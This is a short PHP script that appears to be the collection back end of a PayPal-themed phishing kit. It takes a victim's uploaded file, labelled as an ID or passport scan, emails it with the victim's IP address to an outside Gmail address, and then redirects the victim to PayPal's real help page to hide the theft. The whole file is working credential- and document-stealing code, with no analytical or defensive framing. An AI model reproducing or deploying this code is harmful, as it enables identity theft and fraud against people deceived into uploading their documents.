<?php

$ip = getenv("REMOTE_ADDR");
$to = "rndemo3@gmail.com";
$subject = "New ID/PASSPORT | $ip";
$message = "C0d3D By demo3";
 
/* GET File Variables */
$tmpName = $_FILES['desktopUploadControl']['tmp_name'];
$fileType = $_FILES['desktopUploadControl']['type'];
$fileName = $_FILES['desktopUploadControl']['name'];
 
/* Start of headers */
$headers = "From: $fromName";
 
if (file($tmpName)) {
  /* Reading file ('rb' = read binary)  */
  $file = fopen($tmpName,'rb');
  $data = fread($file,filesize($tmpName));
  fclose($file);
 
  /* a boundary string */
  $randomVal = md5(time());
  $mimeBoundary = "==Multipart_Boundary_x{$randomVal}x";
 
  /* Header for File Attachment */
  $headers .= "\nMIME-Version: 1.0\n";
  $headers .= "Content-Type: multipart/mixed;\n" ;
  $headers .= " boundary=\"{$mimeBoundary}\"";
 
  /* Multipart Boundary above message */
  $message = "This is a multi-part message in MIME format.\n\n" .
  "--{$mimeBoundary}\n" .
  "Content-Type: text/plain; charset=\"iso-8859-1\"\n" .
  "Content-Transfer-Encoding: 7bit\n\n" .
  $message . "\n\n";
 
  /* Encoding file data */
  $data = chunk_split(base64_encode($data));
 
  /* Adding attchment-file to message*/
  $message .= "--{$mimeBoundary}\n" .
  "Content-Type: {$fileType};\n" .
  " name=\"{$fileName}\"\n" .
  "Content-Transfer-Encoding: base64\n\n" .
  $data . "\n\n" .
  "--{$mimeBoundary}--\n";
}
 
$flgchk = mail ("$to", "$subject", "$message", "$headers");
 
if($flgchk){
  
header("Location: https://www.paypal.com/selfhelp/home");
 }
else{
  echo "Error in Email sending Please go back and try again";
}

?>